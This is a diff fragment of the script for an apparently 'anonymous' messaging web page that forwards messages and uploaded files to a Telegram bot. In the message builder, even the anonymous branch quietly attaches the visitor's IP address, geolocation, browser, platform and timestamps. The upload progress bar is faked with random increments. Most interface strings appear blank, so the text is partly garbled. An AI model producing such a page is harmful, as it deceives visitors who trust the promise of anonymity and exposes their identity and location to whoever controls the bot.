+                sendButton.innerHTML = '<i class="fas fa-spinner fa-spin send-icon"></i>  ...';
+            }
+            
+            const typingIndicator = document.getElementById('typingIndicator');
+            typingIndicator.style.display = 'block';
+            
+            try {
+                const messageText = buildMessageText(senderName, message);
+                
+                if (hasFiles()) {
+                    await sendAllFiles(messageText);
+                } else {
+                    await sendTextMessage(messageText);
+                }
+                
+                showToast('   ! ');
+                createConfetti();
+                resetForm();
+                
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('     .', 'error');
+            } finally {
+                if (sendButton) {
+                    sendButton.disabled = false;
+                    sendButton.classList.remove('sending');
+                    sendButton.innerHTML = '<i class="fas fa-paper-plane send-icon"></i>  ';
+                }
+                typingIndicator.style.display = 'none';
+                document.getElementById('progressBar').style.width = '0%';
+            }
+        }
+        
+        function showToast(message) {
+            const toast = document.getElementById('successToast');
+            const toastMessage = toast.querySelector('.toast-message');
+            toastMessage.textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+        
+        function updateProgressBar(percentage) {
+            const progressBar = document.getElementById('progressBar');
+            if (progressBar) {
+                progressBar.style.width = `${percentage}%`;
+            }
+        }
+        
+        function hasFiles() {
+            return selectedFiles.images.length > 0 || selectedFiles.audios.length > 0 || selectedFiles.files.length > 0;
+        }
+        
+        function buildMessageText(senderName, message) {
+            let locationText = ' ';
+            if (userLocation) {
+                const mapsUrl = `https://maps.google.com/?q=${userLocation.lat},${userLocation.lng}`;
+                locationText = `${userLocation.lat.toFixed(4)}, ${userLocation.lng.toFixed(4)}`;
+            }
+            
+            const formattedMessage = message.replace(/\n/g, '\n');
+            
+            if (isAnonymous) {
+                return ` : 
+
+ : ${locationText}
+
+ IP: ${userInfo.ip}
+
+ : ${userInfo.browser} - ${userInfo.platform}
+
+ : ${userInfo.timestamp}
+
+  : ${Math.floor(writingTime / 60)}:${(writingTime % 60).toString().padStart(2, '0')}
+
+ :
+
+${formattedMessage}`;
+            } else {
+                return ` : ${senderName}
+
+ : ${locationText}
+
+ IP: ${userInfo.ip}
+
+ : ${userInfo.browser} - ${userInfo.platform}
+
+ : ${userInfo.timestamp}
+
+  : ${Math.floor(writingTime / 60)}:${(writingTime % 60).toString().padStart(2, '0')}
+
+ :
+
+${formattedMessage}`;
+            }
+        }
+        
+        async function sendAllFiles(messageText) {
+            //   
+            await sendTextMessage(messageText);
+            
+            //   
+            for (const image of selectedFiles.images) {
+                await sendFileWithProgress(image, 'photo', '');
+            }
+            
+            for (const audio of selectedFiles.audios) {
+                await sendFileWithProgress(audio, 'audio', '');
+            }
+            
+            for (const file of selectedFiles.files) {
+                await sendFileWithProgress(file, 'document', '');
+            }
+        }
+        
+        async function sendFileWithProgress(file, type, caption) {
+            return new Promise((resolve, reject) => {
+                const popup = document.getElementById('uploadPopup');
+                const fileIcon = document.getElementById('popupFileIcon');
+                const fileName = document.getElementById('popupFileName');
+                const fileSize = document.getElementById('popupFileSize');
+                const progressBar = document.getElementById('popupProgress');
+                const progressText = document.getElementById('popupPercent');
+                
+                fileName.textContent = file.name;
+                fileSize.textContent = formatFileSize(file.size);
+                
+                if (type === 'photo') {
+                    fileIcon.textContent = '';
+                } else if (type === 'audio') {
+                    fileIcon.textContent = '';
+                } else {
+                    fileIcon.textContent = '';
+                }
+                
+                popup.classList.add('show');
+                
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 2 + Math.random() * 3;
+                    if (progress > 100) progress = 100;
+                    
+                    progressBar.style.width = progress + '%';
+                    progressText.textContent = ` ... ${Math.round(progress)}%`;
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        progressText.textContent = "   !";
+                        
+                        setTimeout(async () => {
+                            try {
+                                await sendFileToTelegram(file, type, caption);
+                                popup.classList.remove('show');
+                                resolve();
+                            } catch (error) {
+                                popup.classList.remove('show');
+                                reject(error);
+                            }
+                        }, 500);
+                    }
+                }, 100);
+            });
+        }
+        
+        async function sendFileToTelegram(file, type, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            
+            if (type === 'photo') {
+                formData.append('photo', file);
+            } else if (type === 'audio') {
+                formData.append('audio', file);
+            } else {
+                formData.append('document', file);
+            }
+            
+            //      
+            if (caption.length > 200) {
+                caption = caption.substring(0, 197) + '...';
+            }
+            
+            formData.append('caption', caption);
+            
+            const endpoint = type === 'photo' ? 'sendPhoto' : type === 'audio' ? 'sendAudio' : 'sendDocument';
+            
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            
+            if (!data.ok) {
+                throw new Error(data.description || `   ${type}`);
+            }
+            
+            return data;
+        }
+        
+        async function sendTextMessage(messageText) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: messageText
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (!data.ok) {
+                    throw new Error(data.description || '   ');
+                }
+                
+                return data;
+            } catch (error) {
+                throw new Error('   : ' + error.message);
+            }
+        }
+        
+        function resetForm() {
+            const messageInput = document.getElementById('messageInput');
+            const charCounter = document.getElementById('charCounter');
+            const senderName = document.getElementById('senderName');
+            const writingTimer = document.getElementById('writingTimer');
+            
+            if (messageInput) messageInput.value = '';
+            if (charCounter) {
+                charCounter.textContent = '0/5,000';
+                charCounter.classList.remove('warning', 'error');
+            }
+            
+            if (writingTimer) writingTimer.textContent = '  : 0 ';
+            
+            writingStartTime = null;
+            writingTime = 0;
+            if (writingTimerInterval) {
+                clearInterval(writingTimerInterval);
+                writingTimerInterval = null;
+            }
+            
+            if (!isAnonymous && senderName) {
+                senderName.value = '';
+            }
+            
+            clearAllFiles();
+            
+            showAlert('   ', 'success');
+        }
+        
+        function clearAllFiles() {
+            selectedFiles = { images: [], audios: [], files: [] };
+            const filePreview = document.getElementById('filePreview');
+            if (filePreview) {
+                filePreview.innerHTML = '';
+                filePreview.style.display = 'none';
+            }
+            
+            const imageInput = document.getElementById('imageInput');
+            const audioInput = document.getElementById('audioInput');
+            const fileInput = document.getElementById('fileInput');
+            
+            if (imageInput) imageInput.value = '';
+            if (audioInput) audioInput.value = '';
+            if (fileInput) fileInput.value = '';
+            
+            updateFileCounts();
+        }
+        
+        function showAlert(message, type) {
+            const alertMessage = document.createElement('div');
+            alertMessage.className = `section ${type === 'error' ? 'error' : 'success'}`;
+            alertMessage.textContent = message;
+            alertMessage.style.marginTop = '10px';
+            alertMessage.style.animation = 'fadeIn 0.3s ease';
+            
+            document.querySelector('.container').appendChild(alertMessage);
+            
+            setTimeout(() => {
+                alertMessage.remove();
+            }, 3000);
+        }
+        
+        function createConfetti() {
+            const colors = ['#7E57C2', '#5E35B1', '#4527A0', '#9575CD'];
+            
+            for (let i = 0; i < 30; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.top = '-20px';
+                confetti.style.width = `${8 + Math.random() * 6}px`;
+                confetti.style.height = confetti.style.width;
+                document.body.appendChild(confetti);
+                
+                const animation = confetti.animate([
+                    { top: '-20px', opacity: 1 },
+                    { top: '100vh', opacity: 0 }
+                ], {
+                    duration: 1500 + Math.random() * 1000,
+                    easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
+                });
+                
+                animation.onfinish = () => {
+                    if (confetti.parentNode) {
+                        confetti.parentNode.removeChild(confetti);
+                    }
+                };
+            }
+        }
+    </script>
+</body>
+</html>
